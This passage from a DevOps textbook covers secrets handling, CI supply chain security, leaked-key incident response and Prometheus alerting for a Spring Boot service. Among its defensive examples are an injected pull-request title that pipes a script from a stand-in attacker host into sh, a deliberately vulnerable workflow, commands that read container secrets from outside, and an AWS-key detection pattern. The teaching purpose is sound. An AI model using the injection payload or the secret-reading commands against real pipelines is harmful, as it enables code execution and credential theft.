blocks.text:
#### Delivery: how the value reaches the process

Three delivery paths exist. **Injection at start** (ECS `secrets.valueFrom`, Kubernetes `secretKeyRef`) copies the value into an environment variable when the container starts; it is simple but the value is visible to inspection and is not refreshed after rotation. **File mounts** (Kubernetes Secret volumes, Docker secrets) place the value in a memory-backed file that the application reads; permissions apply per file. **Fetch at run time** (the application calls Secrets Manager with its task role) keeps the secret out of the container definition entirely and allows refresh, at the cost of application code and a startup dependency.

#### Secrets in CI and CD

**GitHub Actions** stores secrets at repository, environment and organization level. Per docs.github.com (using secrets, consulted October 2026), with the exception of `GITHUB_TOKEN` secrets "are not passed to the runner when a workflow is triggered from a forked repository", and logs are redacted. Redaction relies on exact matching, so a derived value (for example the Base64 of a secret) is not hidden unless it is registered as a secret too (per the secure-use reference). An **environment** adds required reviewers and restricts which branches may deploy; a job targeting the environment cannot read the environment secrets until a reviewer approves (per the same reference).

**Jenkins** stores credentials encrypted on the controller and, per jenkins.io (using credentials), pipelines refer to them only by credential ID. The Credentials Binding plugin supplies the `withCredentials` step, which exposes the value as an environment variable for one block and masks it in the console log (from memory; verify the plugin documentation). Masking does not protect against a script that transforms the value, for example by printing it character by character.

**Kubernetes** Secrets are API objects; the data is Base64-encoded, which is an encoding and not encryption. Protection comes from encryption at rest in etcd, RBAC limiting `get` and `list` on secrets, and not storing manifests with real values in Git (see the Kubernetes chapters and the GitOps discussion in this Part).

#### Rotation

Rotation replaces a secret on a schedule or after exposure. Per docs.aws.amazon.com (rotating secrets), "managed rotation" for managed secrets needs no Lambda function, and other secrets are rotated by a Lambda function that updates both the secret and the database. Rotation succeeds only if consumers pick up the new value: an ECS task receives it only after a new deployment, because secrets are resolved at container start. Access keys follow the pattern create second key, switch consumers, confirm the old key is unused, deactivate, delete; an IAM user can hold at most two access keys (per the IAM access keys page).

### Worked example

#### An environment variable is not private

The experiment starts a container with a password in an environment variable and reads it two ways. The image is a static test program built on the build machine (`FROM scratch`); the container ran with `--network none`.

blocks.code:
$ docker run -d --name v6-secret-demo --network none -e DB_PASSWORD=s3cr3t-Passw0rd v6-secret-demo:1
$ docker inspect --format '{{.Config.Env}}' v6-secret-demo
[DB_PASSWORD=s3cr3t-Passw0rd PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin]
$ PID=$(docker inspect --format '{{.State.Pid}}' v6-secret-demo)
$ tr '\0' '\n' < /proc/$PID/environ | grep DB_PASSWORD
DB_PASSWORD=s3cr3t-Passw0rd
blocks.title: Reading an environment variable from outside the container (real output, build machine)

blocks.text:
Anyone with access to the Docker API on the host, or to the process table, reads the value. The same holds for an ECS task definition (the plaintext `environment` array is shown in the console and returned by `describe-task-definition`) and for a Kubernetes pod specification. The conclusion is not that environment variables are forbidden, but that a password belongs in `secrets`, not in `environment`, and that the delivery path must be access-controlled.

#### Finding a committed secret in history

The next experiment reproduces the most common leak: a key is committed, noticed, and deleted in a later commit. The key used is the example key from the AWS documentation, which grants nothing.

blocks.code:
$ git grep -nE 'AKIA[0-9A-Z]{16}' || echo "(no match in working tree)"
(no match in working tree)
$ git log --all --oneline -S'AKIAIOSFODNN7EXAMPLE'
fc52839 Remove credentials from configuration
4ba48fe Add S3 export settings
$ git grep -lE 'AKIA[0-9A-Z]{16}' $(git rev-list --all)
4ba48fe8bd6c3073d9b2e90ce4805e233d19559d:src/main/resources/application.properties
blocks.title: Search the working tree and the history (real output, build machine)

blocks.text:
What to notice. The working tree is clean, yet the key is recoverable from commit `4ba48fe` by anyone with a clone. The `-S` search (the "pickaxe") lists every commit that added or removed the string; `git rev-list --all` feeds every commit to `git grep`. Deleting the line in a new commit never removes the secret from history.

#### Preventing the commit: a pre-commit hook

A local hook rejects the commit before it exists. Hooks are not copied by `git clone`, so a hook protects only the developers who install it; the server-side counterpart is secret scanning with push protection. Per docs.github.com (about push protection), push protection blocks pushes that contain secrets; at repository level it is disabled by default and must be enabled by an administrator, and it requires GitHub Secret Protection, while the user-level setting is enabled by default for public repositories on GitHub.com.

blocks.code:
#!/bin/sh
# Reject staged additions that look like an AWS access key id.
if git diff --cached -U0 | grep -E '^\+.*AKIA[0-9A-Z]{16}' >/dev/null; then
  echo "pre-commit: possible AWS access key id in staged changes; commit rejected" >&2
  exit 1
fi
blocks.title: .git/hooks/pre-commit

blocks.code:
$ echo 'aws.accessKeyId=AKIAIOSFODNN7EXAMPLE' > application.properties
$ git add application.properties
$ git commit -m "Add export settings"
pre-commit: possible AWS access key id in staged changes; commit rejected
$ echo $?
1
$ echo 'aws.accessKeyId=${AWS_ACCESS_KEY_ID}' > application.properties
$ git add application.properties && git commit -qm "Add export settings" && echo committed
committed
blocks.title: The hook in action (real output, build machine)

blocks.text:
The corrected line uses a placeholder resolved from the environment at run time, which Spring Boot supports in property files. Pattern-based scanning detects only known formats; passwords without a recognizable shape need a dedicated scanner and review.

### Hands-on

1. Create a repository, commit a file containing the AWS example key, remove it in a second commit and locate it with `git log -S` and `git grep -l` over `git rev-list --all`.
2. Install the pre-commit hook above and confirm that a staged key is rejected.
3. Start any container with `-e SECRET=value` and read the value with `docker inspect`; repeat with a file bind mount and observe that the value no longer appears in `inspect` output.
4. In a Spring Boot project, move `spring.datasource.password` out of `application.properties` and supply it as `SPRING_DATASOURCE_PASSWORD`; then try `spring.config.import=optional:configtree:/run/secrets/`.

### Real-world problems and solutions

#### Secrets in plain environment variables

**Scenario.** The ECS task definition stores `SPRING_DATASOURCE_PASSWORD` in the `environment` array and is committed to the repository as `deploy/taskdef.json`. **Symptoms.** A code review comment, a secret scanner alert, or the password visible in the ECS console and in `aws ecs describe-task-definition` output. **Diagnosis.** Search the repository and every task definition revision for the value; list revisions with `aws ecs list-task-definitions --family-prefix` `orders-service`. Old revisions keep the plaintext. **Root cause.** The password was treated as configuration. Every revision of a task definition is immutable and retains whatever was registered. **Fix.** Move the value to Secrets Manager, reference it with `secrets.valueFrom`, register a new revision, deploy, then rotate the password (the old value is exposed in old revisions) and deregister the old revisions. **Prevention.** A repository check that fails the build when an `environment` entry name matches `PASSWORD`, `SECRET` or `TOKEN`; secret scanning with push protection.

#### Secret printed in a CI log

**Scenario.** A debugging step runs `env` or `echo "$TOKEN"`. **Symptoms.** The log shows the value, or shows `***` for the exact secret but the Base64 form in clear text. **Diagnosis.** Search the run log for fragments of the value and for encoded variants. **Root cause.** Redaction matches exact registered values only (per the GitHub secure-use reference). **Fix.** Delete the run logs, rotate the secret, remove the debugging step. **Prevention.** Never print the environment; create one secret per value instead of structured JSON; register derived values with `::add-mask::`.

### Questions to expect

#### Why should configuration not be stored in the code repository?

Configuration varies between deployments and may be confidential. In the repository it requires a rebuild for each change, and a secret remains in history permanently. The twelve-factor test is whether the repository could be published without exposing credentials.

#### Are environment variables a safe place for secrets?

They are acceptable as a delivery mechanism if the definition that sets them is access-controlled, but they are visible to anyone who can inspect the container or process. Files mounted from a secret store, or run-time retrieval with an IAM role, expose less.

#### What is the difference between a GitHub repository secret and an environment secret?

A repository secret is available to every workflow in the repository. An environment secret is available only to jobs that target that environment and can be gated by required reviewers and branch restrictions.

#### Is a Kubernetes Secret encrypted?

Not by default in the sense of confidentiality: the data is Base64-encoded. Encryption at rest must be configured for etcd, access limited by RBAC, and real values kept out of Git.

#### How is a secret rotated without downtime?

Create the new value while the old one remains valid, switch consumers (a new deployment for ECS), verify that the old value is unused, then revoke it. Database credentials use two users or the staging-label mechanism of the secret store.

#### Why is deleting a committed secret in a new commit insufficient?

The old commit still contains it and is reachable from clones, forks and caches. The secret must be revoked; history rewriting is only cleanup.

blocks.title: Key points
blocks.text:
- Configuration and secrets stay outside the repository and the image; the twelve-factor test is "could the codebase be published today".
- Choose the delivery path by exposure: files or run-time retrieval over plain environment variables; ECS `secrets` over `environment`.
- GitHub secrets are masked by exact match only and are withheld from fork workflows; environments add approval gates.
- A committed secret is permanent in history: detect with `git log -S`, prevent with hooks and push protection, remediate by revoking.
- Rotation must reach consumers: ECS tasks and pods read secrets at start.

A pipeline holds the keys to production: it can build code, sign it and replace the running service. An attacker who controls any step of it controls what the users run. Supply chain security is the set of controls that make each step in the path from a commit to a running container verifiable: who wrote the change, which dependencies it pulled, which system built it and whether the artifact that runs is the artifact that was built.

#### The attack surface of a delivery path

blocks.text:
#### Protect the source

**Branch protection** (or rulesets) makes `main` the only path to production and states how a change may enter it. Per docs.github.com (about protected branches, consulted October 2026) the options include "Require pull request reviews before merging", "Require status checks before merging", "Require signed commits", "Require linear history", restriction of force pushes (blocked on protected branches by default) and "Require deployments to succeed before merging"; rulesets lift the limitation of classic rules that only one rule can apply at a time.

**Signed commits and tags** bind a change to a cryptographic identity. A commit signature proves that the holder of a key created the commit; it does not prove that the change is correct. Git signs with GPG (the default), with SSH keys or with X.509 certificates; the experiment below uses GPG because that is installed on the build machine.

blocks.code:
$ git config user.signingkey D5C7D16569A018A2
$ git commit -q -S -m "Add a (signed)"
$ git commit -q --allow-empty -m "Add b (unsigned)"
$ git tag -s -m "Release 1.0.0" v1.0.0 HEAD~1
$ git log --format='%h %G? %GS  %s'
d58faac N   Add b (unsigned)
0b14536 G Maruthi Sreeram <dev@example.com>  Add a (signed)
$ git verify-commit HEAD; echo "exit status: $?"
exit status: 1
$ git verify-commit HEAD~1
gpg: Good signature from "Maruthi Sreeram <dev@example.com>" [ultimate]
$ git verify-tag v1.0.0
gpg: Good signature from "Maruthi Sreeram <dev@example.com>" [ultimate]
blocks.title: Create, sign and verify (real output, build machine; key identifiers shortened)

blocks.text:
What to notice. `%G?` prints `G` for a good signature and `N` for none; `git verify-commit` exits non-zero for the unsigned commit. The key used was generated in a throw-away keyring and is not trusted anywhere. On GitHub, a commit is shown as Verified only when the signing public key is registered to the author's account, and the branch rule "Require signed commits" rejects other pushes.

#### Protect the dependencies

A Spring Boot service pulls dozens of transitive libraries. Three risks are distinct. **Known vulnerabilities** in a dependency are detected by software composition analysis (Dependabot alerts, OWASP Dependency-Check; see the chapter on quality gates). **Typosquatting** publishes a package whose name resembles a popular one. **Dependency** **confusion** publishes a public package with the same name as an internal one and a higher version, so that a build resolving from a public repository fetches the attacker's code. Mitigations (general practice; verify against the repository manager documentation): own the `groupId` namespace through a reverse domain name; route all resolution through a repository manager configured as the single mirror (`mirrorOf *` in `settings.xml`) with internal groups resolved only from internal repositories; commit dependency versions explicitly and review upgrades in pull requests.

A **software bill of materials (SBOM)** lists the components inside an artifact. Two formats are in wide use, CycloneDX and SPDX (from memory). An SBOM turns the question "are we affected by the new vulnerability" into a search. For Maven, a CycloneDX plugin generates it during `package` (plugin coordinates from memory; verify before use); GitHub can also export the dependency graph as an SBOM.

#### Protect the build

Third-party actions run with the permissions of the job. Per docs.github.com (secure use reference): pin an action to a full-length commit SHA, because "a tag can be moved or deleted"; set the default `GITHUB_TOKEN` permission to read-only and widen per job; prefer OIDC to stored cloud keys; avoid `pull_request_target` and `workflow_run` with untrusted code; and never interpolate untrusted input into a shell script.

blocks.code:
# Vulnerable: the title is pasted into the shell script before the shell runs.
name: label-pr-unsafe
on: pull_request
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Title is ${{ github.event.pull_request.title }}"
---
# Safer: the value travels as an environment variable and is quoted.
name: label-pr-safe
on: pull_request
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "Title is $TITLE"

blocks.text:
A pull request titled `"; curl https://attacker.example/x | sh; "` becomes shell text in the first workflow. In the second the title is data. The pattern is the one the GitHub reference recommends: assign the expression to an intermediate environment variable and quote it.

**Self-hosted runners** deserve separate care. The GitHub reference warns that anyone who can fork the repository and open a pull request could compromise a self-hosted runner and reach its secrets, and that such runners "should almost never be used for public repositories". A runner that is reused between jobs retains files, credentials and caches; ephemeral runners (a fresh VM or container per job) remove that persistence. The same principle applies to Jenkins agents: run builds on disposable agents, give the controller no build executors, and keep deployment credentials in folder-scoped credentials rather than global ones.

#### Protect the artifact

Immutable tags (the ECR setting used earlier) stop a tag from being re-pointed to different content; a **digest** (`sha256:...`) names content exactly and is the strongest reference. A Dockerfile that must be reproducible pins the base image by digest in addition to the tag (illustrative: `FROM eclipse-temurin:21-jre@sha256:<digest>`; not built here because the build machine has no registry access).

**Provenance** records how an artifact was built. SLSA (Supply-chain Levels for Software Artifacts) defines build levels; per slsa.dev (v1.0 levels page, which is marked retired in favour of version 1.2), Build L1 means provenance exists, L2 means a hosted build platform generates and signs it, and L3 means hardened builds that protect the provenance from user-defined build steps. Per docs.github.com (artifact attestations), attestations by themselves provide "SLSA v1.0 Build Level 2", building in a reusable workflow can reach Build Level 3, and `gh attestation verify` checks them; the page also warns that an attestation is "not a guarantee that an artifact is secure", only a verifiable link to source and build.

**cosign** (Sigstore) signs container images. Per docs.sigstore.dev, keyless signing associates an OIDC identity with a signature through short-lived certificates (Fulcio) and a transparency log (Rekor), and verification takes the form `cosign verify IMAGE --certificate-identity=... --certificate-oidc-issuer=...`. The issuer value for GitHub Actions identities is `https://token.actions.githubusercontent.com` (from memory; the sigstore page consulted did not show it, verify before use). Verification matters only if something enforces it: a Kubernetes admission policy or a deployment step must refuse images without a valid signature.

### Worked example

The repository settings below form the minimum protective baseline for `orders-service`. They were assembled from the GitHub documentation cited above and are not testable on the build machine.

rows: Pull request required, 1 approval, required status check `build`, force pushes blocked, signed commits required
Direct pushes, history rewriting, unverified authorship
Default `GITHUB_TOKEN` read-only; actions pinned to SHAs; `permissions:` per job
Environment `production` with required reviewer and branch restriction
Unreviewed release, secret access from other branches
OIDC role with `sub` pinned to repository and environment
Immutable ECR tags, scan on push, attestation and signature verified before deploy
Dependabot alerts and updates, SBOM generated at build
Secret scanning with push protection; no secrets in `environment`

blocks.text:
### Hands-on

1. In a throw-away repository, generate a GPG key with `gpg --quick-generate-key`, set `user.signingkey`, make a signed commit and an unsigned commit, and compare `git log --format='%h %G? %s'`.
2. Take a workflow from any public repository and list every `uses:` line that is not pinned to a SHA.
3. Rewrite the unsafe workflow above so that the pull request title reaches the shell only as an environment variable.
4. Decide, for each of the seven rows of the baseline table, which part is enforced by tooling and which depends on a person following a rule.

### Real-world problems and solutions

#### A compromised third-party action

**Scenario.** A widely used action referenced as `@v3` publishes a malicious update by moving the tag. **Symptoms.** Unexpected outbound network connections from runners, secrets used from unknown addresses, a changed checksum of the action. **Diagnosis.** Compare the commit behind the tag with the previous one; review the run logs for added steps; list repositories using the action. **Root cause.** A tag is a movable pointer, and the workflow trusted it. **Fix.** Pin to the known-good commit SHA, rotate every secret the workflow could read, review recent deployments. **Prevention.** Pin actions by SHA and update them through Dependabot pull requests; restrict the allowed actions at organization level; limit job permissions so that one compromised step has little to steal.

#### Fork pull request cannot deploy a preview

**Scenario.** A contributor opens a pull request from a fork and the workflow needs a registry credential. **Symptoms.** `secrets.REGISTRY_TOKEN` is empty; the push step fails with an authentication error. **Diagnosis.** The event is `pull_request` from a fork, for which secrets are withheld (per the GitHub secrets page). **Root cause.** The restriction is deliberate: the workflow file comes from the fork and could print the secret. **Fix.** Build without pushing for fork pull requests; deploy previews from a separate workflow that a maintainer triggers after review, never by checking out the fork code under `pull_request_target`. **Prevention.** Split the pipeline into an unprivileged verification workflow and a privileged deployment workflow.

### Questions to expect

#### What is a supply chain attack in software delivery?

An attack on something the build trusts rather than on the application: a dependency, a build tool, a CI action, a registry or a developer account. The goal is to place malicious code in the artifact that production runs.

#### Why pin actions to a commit SHA?

A tag or branch can be moved to different code. A full-length SHA identifies one immutable commit, so the workflow runs exactly the reviewed code. Updates are then deliberate, for example through Dependabot.

#### What is dependency confusion?

A public package with the same name as an internal package and a higher version causes a build that consults a public repository to download the attacker's version. Defences are namespace ownership, a single controlled repository manager and explicit version control.

#### What is an SBOM and why generate one?

A machine-readable inventory of an artifact's components (CycloneDX or SPDX formats). It allows an organization to determine within minutes whether a newly disclosed vulnerable library is present in any deployed image.

#### What does a signature on a commit or an image prove?

That the holder of a particular key or identity produced it, and that it has not been altered since. It does not prove that the content is safe, so signatures are combined with review, scanning and enforcement at deploy time.

#### How does OIDC improve pipeline security compared with stored access keys?

No long-lived credential exists to steal. Each job receives a token that AWS exchanges for temporary credentials, and the trust policy restricts which repository, branch or environment may do so.

#### What is the risk of `pull_request_target`?

It runs in the context of the base repository with access to secrets. If it checks out and executes code from the pull request, a contributor can run arbitrary code with those secrets.

blocks.title: Key points
blocks.text:
- Every hand-over from commit to container needs a control: protected branches, reviewed dependencies, pinned and least-privilege build steps, verified artifacts.
- Pin third-party actions to commit SHAs, set `GITHUB_TOKEN` to read-only by default, and never paste untrusted input into a shell script.
- Fork pull requests run without secrets by design; separate unprivileged checks from privileged deployment.
- Signatures, SBOMs and provenance make artifacts verifiable only when deployment enforces the verification.
- Prefer ephemeral runners and OIDC so that no long-lived credential survives between jobs.

Prevention reduces the number of leaks; it does not reach zero. A credential eventually appears in a repository, a log, a screenshot or a support ticket. The response to that event decides whether it remains an incident or becomes a breach. The order of actions matters: first make the credential useless, then find out what it did, then clean up.

### Concept and mechanism

#### Treat the secret as public from the moment of exposure

Automated scanners crawl public repositories continuously, so a key pushed to a public repository must be assumed to be copied within minutes (general observation; no measurement is claimed). A private repository leak is also serious, because the value spreads to every clone and CI cache. History rewriting removes the text from the visible repository but not from copies already made, so **revocation is the only remediation that works**; rewriting is cleanup.

blocks.text:
#### The five steps

1. **Revoke or deactivate** the credential at its source. For an AWS access key: `aws iam update-access-key` `--status Inactive` is reversible and immediate; `delete-access-key` is permanent (commands from general AWS CLI knowledge; verify against the access key documentation, which the consulted page did not cover).
2. **Rotate**: issue a new credential, deploy it to the consumers, confirm that the old one is unused (`aws iam` `get-access-key-last-used`).
3. **Audit**: determine what the credential did between exposure and revocation. AWS CloudTrail records API activity; the IAM documentation recommends CloudTrail to monitor access key usage and CloudWatch alarms for denied attempts. Search for resources created that nobody recognizes (instances in unused Regions are a typical sign of key abuse) and for data access.
4. **Clean the history**: remove the secret from Git history with `git filter-repo` or BFG Repo-Cleaner, force-push all branches and tags, ask collaborators to re-clone, and request removal of cached views and forks (see the Git chapter on recovering from mistakes for the mechanics).
5. **Prevent**: add the control that was missing (push protection, pre-commit hook, replacing the key with an OIDC role) and record the incident.

### Worked example

The following runbook can be stored in the repository and rehearsed. It is written for an exposed AWS access key of an IAM user and is illustrative; the commands were not run because no AWS account was available.

blocks.code:
#!/bin/bash
# Illustrative runbook (not run). Usage: ./leaked-key-runbook.sh USER_NAME ACCESS_KEY_ID
set -euo pipefail
USER_NAME="$1"
KEY_ID="$2"

echo "1. Deactivate the key (reversible)"
aws iam update-access-key --user-name "$USER_NAME" --access-key-id "$KEY_ID" --status Inactive

echo "2. When was it last used, and by which service"
aws iam get-access-key-last-used --access-key-id "$KEY_ID"

echo "3. Recent API calls made with the key (CloudTrail lookup)"
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=AccessKeyId,AttributeValue="$KEY_ID" \
  --max-results 50 \
  --query 'Events[].[EventTime,EventName,EventSource]' --output text

echo "4. Create the replacement only after the audit and update the consumers"
echo "   aws iam create-access-key --user-name $USER_NAME"
blocks.title: leaked-key-runbook.sh

blocks.text:
What to notice. Deactivation comes before any investigation, because every minute of delay is a minute of possible abuse. The key is deactivated rather than deleted so that the audit can still map the key identifier to events. `lookup-events` with the `AccessKeyId` attribute is part of CloudTrail (syntax from memory; verify). Step 4 prints a command instead of running it, because creating a new long-lived key is itself the practice that this guide replaces by roles; the permanent fix is to remove the user and its keys and move the consumer to a role.

### Hands-on

1. In the lab repository from the previous chapter, simulate the leak, then locate the commit with `git log -S`.
2. Write the five steps as a checklist for the `orders-service` repository, naming for each step the person responsible and the command or console page used.
3. Rehearse with a harmless secret: rotate the lab database password, deploy the change and confirm in the logs that the old password is rejected.

### Real-world problems and solutions

#### Leaked access key

**Scenario.** A student pushes `application.properties` with an AWS access key to a public repository. An email from the cloud provider reports exposed credentials, or the monthly bill shows unfamiliar compute charges. **Symptoms.** Instances in Regions never used by the team, an unexpected cost spike, an alert about a public key, CloudTrail events from unknown IP addresses. **Diagnosis.** `aws cloudtrail lookup-events` filtered by the key id; the Cost Explorer view by Region and service; the IAM credential report for keys and last-used dates. **Root cause.** A long-lived key with broad permissions was committed. Nothing blocked the push, and the key was never scoped or rotated. **Fix.** Deactivate the key, audit and terminate unknown resources, rotate dependent systems, delete the user key, remove the secret from history, report the incident to the provider if charges arose. **Prevention.** Roles and OIDC instead of keys; scoped policies; push protection and pre-commit hooks; billing alarms; a rehearsed runbook.

#### The secret was removed from history but the incident continues

**Scenario.** History was rewritten and force-pushed; a week later the credential is used from an unknown address. **Symptoms.** Calls using the credential continue after the rewrite. **Diagnosis.** The credential was never revoked, or a fork or clone made before the rewrite still holds it. **Root cause.** Cleanup was treated as remediation. **Fix.** Revoke and rotate at the source. **Prevention.** Make "revoke first" the first line of the runbook.

### Questions to expect

#### A secret was pushed to a public repository. What is the first action?

Revoke or deactivate the credential at its source. Removing the commit does not help, because the value is assumed copied. Rotation, audit and history cleanup follow.

#### Why deactivate an access key instead of deleting it?

Deactivation is immediate and reversible and keeps the key identifier available for audit. Deletion is permanent and is performed after the investigation confirms that no system depends on the key.

#### How is the activity of a leaked key investigated on AWS?

CloudTrail records API calls, searchable by access key id. The review covers resources created, data read, permissions changed and Regions used, and is compared with the cost and billing view.

#### Can the credential be considered safe after `git filter-repo`?

No. Forks, clones and caches may hold the old history, so the credential stays compromised until it is revoked.

#### What is the long-term fix for leaked cloud keys in CI?

Remove the keys: use OIDC role assumption in pipelines and instance or task roles for services, so that no static credential exists to leak.

blocks.title: Key points
blocks.text:
- Assume exposure the moment a secret leaves its store; revoke first, clean later.
- The order is revoke, rotate, audit, clean history, prevent; history rewriting never makes a leaked secret safe.
- Deactivate before delete, and use CloudTrail to learn what the credential did.
- The durable fix is architectural: roles and short-lived credentials leave nothing static to leak.
- Write the runbook before the incident and rehearse it.

A deployment that passes every pipeline stage can still fail in production: a configuration value differs, a dependency is slow, traffic has a shape that no test produced. **Observability** is the ability to answer "what is the service doing and why" from the data it emits, without shipping new code. A release is complete only when the team can see its effect. This chapter defines the signals, shows what to configure in `orders-service`, and measures with a simulation how the alerting window determines how long a bad release stays undetected. The Spring Boot, Micrometer and Prometheus material is covered in the Spring Boot guides; this chapter adds only what concerns releasing.

### Concept and mechanism

#### Health checks, logs, metrics and traces

A **health check** answers a binary question for the platform: may traffic be sent here, and should this instance be restarted. Liveness and readiness are distinct (see the Kubernetes chapters); the ALB health check of the AWS chapter uses `/actuator/health`. Per the Spring Boot reference (actuator endpoints, consulted October 2026), only the `health` endpoint is exposed over HTTP by default, details are hidden unless `management.endpoint.health.show-details` is changed, and the liveness and readiness state indicators can be controlled with `management.endpoint.health.probes.enabled`.

Three kinds of telemetry complement the health check.

- **Logs** are timestamped records of events. Structured logs (JSON) can be searched by field. Per the Spring Boot reference (logging), `logging.structured.format.console` selects a structured format; the built-in formats are `ecs`, `gelf` and `logstash`. The version that introduced the feature is not stated on that page (Spring Boot 3.4 from memory; verify).
- **Metrics** are numbers aggregated over time (request count, latency histogram, JVM heap). They are cheap to store and suited to alerting.
- **Traces** follow one request across services as spans that share a trace identifier. They locate where time was spent.

blocks.text:
#### What to measure: the golden signals

The Google SRE book (monitoring distributed systems, consulted October 2026) names four golden signals: **latency** ("the time it takes to service a request"), **traffic** (demand on the system), **errors** ("the rate of requests that fail") and **saturation** ("how full your service is"). It also advises spending "much more effort on catching symptoms than causes" when alerting. Applied to `orders-service`: the error ratio and the 95th percentile latency of HTTP requests are symptoms that justify a page; a high CPU value is a cause that justifies a dashboard panel.

#### Configuration of orders-service

blocks.code:
management.endpoints.web.exposure.include=health,info,prometheus
management.endpoint.health.probes.enabled=true
logging.structured.format.console=ecs
blocks.title: application.properties (observability settings)

blocks.text:
Per the Spring Boot reference (metrics), the Prometheus registry is configured when `micrometer-registry-prometheus` is on the runtime classpath together with the actuator starter, and the endpoint `/actuator/prometheus` is not available until it is exposed. The Prometheus side is a scrape job with `metrics_path: "/actuator/prometheus"` (the example in the Spring Boot documentation). The structured logging value is used here as documented on the logging page; the exact format of the log fields should be checked against the chosen backend. The metrics endpoint must not be reachable from the internet; expose it on the private network or on a separate management port.

#### Deployment markers

A **deployment marker** is a point-in-time annotation on dashboards stating that version X went live. Without it, correlating a jump in errors with a release requires searching chat history. Two inexpensive sources exist: the running version reported by the service itself (the `/actuator/info` endpoint with `git.commit.id` when the build generates `git.properties`; from memory), and an annotation written by the pipeline at the end of the deploy step.

blocks.text:
### Worked example

#### An alert on the error ratio

The rule below fires when more than 5 percent of requests fail for two minutes. It is written in the Prometheus alerting rule format (groups, rules, `alert`, `expr`, `for`, `labels`, `annotations`; per prometheus.io, consulted October 2026). The selector `job="orders-service"` refers to the scrape job name. The `for` clause keeps the alert in a pending state until the condition has held for the whole duration. The metric name `http_server_requests_seconds_count` and its `status` label are what Micrometer exports for Spring MVC from memory; they must be checked in the Prometheus UI before the rule is relied on. The file was parsed with PyYAML; Prometheus itself was not run.

blocks.code:
groups:
  - name: orders-service
    rules:
      - alert: OrdersHighErrorRatio
        expr: |
          sum(rate(http_server_requests_seconds_count{job="orders-service",status=~"5.."}[5m]))
          /
          sum(rate(http_server_requests_seconds_count{job="orders-service"}[5m])) > 0.05
        for: 2m
        labels:
          severity: page
        annotations:
          summary: "orders-service error ratio above 5 percent"
          runbook: "https://example.com/runbooks/orders-high-error-ratio"
blocks.title: orders-alerts.yml (illustrative configuration, not run)

blocks.text:
#### How the window decides the detection time

A rule has three tunable values: the size of the averaging window, the threshold and the `for` duration. A short window reacts fast and is noisy; a long window is stable and slow. The simulation generates one request count and one error count per second for 30 minutes and applies the rule at 15-second evaluation intervals. All parameters are assumptions, chosen to represent a service with a steady 50 requests per second and a bad release at second 600 that fails 12 percent of requests; the output is real, produced on the build machine, and describes the simulation, not a measurement of any real system.

blocks.code:
import random

RATE = 50            # requests per second (assumed)
BASE_ERR = 0.002     # baseline error probability (assumed)
BAD_ERR = 0.12       # error probability after the bad release (assumed)
DEPLOY_AT = 600      # seconds; the bad release takes all traffic at once (simplification)
THRESHOLD = 0.05     # alert when the error ratio exceeds 5 percent
FOR = 120            # the condition must hold for 120 s before the alert fires
EVAL = 15            # evaluation interval in seconds
END = 1800

rng = random.Random(7)
total, errors = [], []
for t in range(END):
    p = BAD_ERR if t >= DEPLOY_AT else BASE_ERR
    n = rng.randint(RATE - 5, RATE + 5)
    total.append(n)
    errors.append(sum(1 for _ in range(n) if rng.random() < p))


def run(window):
    pending_since = None
    for t in range(window, END, EVAL):
        ratio = sum(errors[t - window:t]) / sum(total[t - window:t])
        if ratio > THRESHOLD:
            if pending_since is None:
                pending_since = t
            if t - pending_since >= FOR:
                return pending_since, t
        else:
            pending_since = None
    return None, None
print("window  first breach  fires at  delay after deploy  failed requests until fire")
for window in (60, 300, 900):
    first, fire = run(window)
    failed = sum(errors[DEPLOY_AT:fire])
    row = (window, first, fire, fire - DEPLOY_AT, failed)
    print("%4d s   %5d s       %5d s   %6d s            %6d" % row)
before = slice(0, DEPLOY_AT)
print("baseline error ratio before the deploy: %.4f (%d errors in %d requests)"
      % (sum(errors[before]) / sum(total[before]), sum(errors[before]), sum(total[before])))

blocks.text:
What to notice. (1) The rule fires `FOR` seconds after the first breach, so the detection delay is the sum of the time the window needs to cross the threshold and the `for` duration. (2) A 15-minute window delays detection by about eight minutes in this simulation and the bad release serves about three times as many failed requests as the 60-second window. (3) The short window also reacts to random noise, a cost that this single run does not quantify; the choice is a trade-off, and many teams combine a short and a long window. (4) Faster detection is only useful if a rollback follows; the next chapter treats it.

### Hands-on

1. Run `alertsim.py`. Change `BAD_ERR` to 0.03 (below the threshold) and observe that no window fires; explain why a slow degradation needs a different alert (latency or a lower threshold).
2. Change `FOR` to 30 and 300 and record the effect on the detection delay of the 60-second window.
3. Enable the three settings of `application.properties` in a local Spring Boot project, start it and open `/actuator/prometheus`. Locate the `http_server_requests_seconds_count` line after calling any endpoint once.
4. Write the sentence that the runbook for `OrdersHighErrorRatio` must start with (what to check first, in one line).

### Real-world problems and solutions

#### Alert noise after every deployment

**Scenario.** The error-ratio alert fires for two minutes after each rolling deployment and recovers. **Symptoms.** Pages with no user impact; the on-call engineer begins to ignore the alert. **Diagnosis.** Overlay deployment markers on the alert history: the alerts start at the deployment time. Inspect the 5xx responses: they come from requests routed to a task that is not yet ready, or from connections drained during shutdown. **Root cause.** Readiness is reported too early, or graceful shutdown is not configured, so in-flight requests fail when old tasks stop. **Fix.** Gate readiness on real dependencies, set `server.shutdown=graceful`, and align the ALB deregistration delay with the shutdown time (see the chapter on container shutdown). **Prevention.** Treat post-deploy alerts as defects of the release process and fix the cause; raising the threshold only hides it.

#### Metrics endpoint exposed to the internet

**Scenario.** `/actuator/prometheus` answers on the public load balancer address. **Symptoms.** A scanner report; the endpoint reveals internal URI patterns and library versions. **Diagnosis.** Request the path through the ALB DNS name. **Root cause.** The endpoint was exposed with `management.endpoints.web.exposure.include` on the same port and listener as the public API. The Spring Boot reference states that exposed endpoints should be secured when the application is public. **Fix.** Serve management endpoints on a separate port that only the monitoring system can reach, or add a listener rule that returns 404 for `/actuator/*` except the health check. **Prevention.** A smoke test in the pipeline that asserts a 404 for `/actuator/env` and `/actuator/prometheus` on the public address.

### Questions to expect

#### What are logs, metrics and traces, and when is each used?

Logs record discrete events and explain what happened; metrics are aggregated numbers used for dashboards and alerts; traces follow one request across services and show where time was spent. An alert usually starts from a metric, and logs and traces are consulted to explain it.

#### What are the four golden signals?

Latency, traffic, errors and saturation. Alerts should be based on symptoms (error rate, latency) that users experience, with causes such as CPU on dashboards.

#### What is the difference between liveness and readiness?

